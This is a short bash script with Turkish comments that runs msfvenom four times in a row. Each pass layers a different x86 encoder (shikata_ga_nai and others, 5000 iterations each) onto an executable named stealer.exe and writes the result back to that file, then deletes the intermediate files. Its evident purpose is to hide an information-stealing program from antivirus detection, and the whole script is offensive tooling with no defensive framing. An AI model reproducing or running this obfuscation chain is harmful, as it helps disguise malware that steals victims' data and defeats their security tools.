#!/bin/bash

# İlk encode işlemi
msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 5000 -f exe -o temp_stealer.exe

# İkinci encode işlemi
msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai -i 5000 -f exe -o temp_stealer_v2.exe

# Üçüncü encode işlemi
msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/countdown -i 5000 -f exe -o temp_stealer_v3.exe

# Dördüncü encode işlemi
msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o stealer.exe

# Temizlik 
rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe
